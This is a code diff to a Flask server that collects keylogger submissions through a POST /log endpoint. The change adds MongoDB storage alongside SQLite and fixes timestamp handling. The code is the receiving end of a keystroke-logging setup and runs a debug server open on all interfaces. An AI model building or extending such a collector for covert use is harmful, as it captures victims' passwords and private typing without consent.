@@ -3,6 +3,9 @@ import sqlite3
 import datetime
 from pymongo import MongoClient
 
+client = MongoClient("mongodb://localhost:27017/")
+db = client.keylogger
+logs_collection = db.logs
 
 app = Flask(__name__)
 
@@ -15,20 +18,27 @@ def create_db():
     conn.close()
 
 def save_log_to_db(log_data):
+    timestamp = datetime.datetime.now().isoformat()  # Fix here
+
     try:
         conn = sqlite3.connect('keylogger.db')
         c = conn.cursor()
         c.execute("INSERT INTO logs (timestamp, log_data) VALUES (?, ?)",
-                  (datetime.datetime.now(), log_data))
+                  (timestamp, log_data))
         conn.commit()
     except sqlite3.Error as e:
-        print(f"Error saving log to database: {e}")
+        print(f"Error saving log to SQLite: {e}")
     finally:
         conn.close()
 
-client = MongoClient("mongodb://localhost:27017/")
-db = client.keylogger
-logs_collection = db.logs
+    try:
+        logs_collection.insert_one({
+            "timestamp": timestamp,
+            "log_data": log_data
+        })
+        print("Log saved to MongoDB")
+    except Exception as e:
+        print(f"MongoDB Error: {e}")
 
 @app.route('/log', methods=['POST'])
 def log_key():
@@ -50,7 +60,6 @@ def get_logs():
     conn.close()
     return jsonify(logs)
 
-
 if __name__ == '__main__':
-    create_db() 
+    create_db()
     app.run(debug=True, host="0.0.0.0", port=5008)
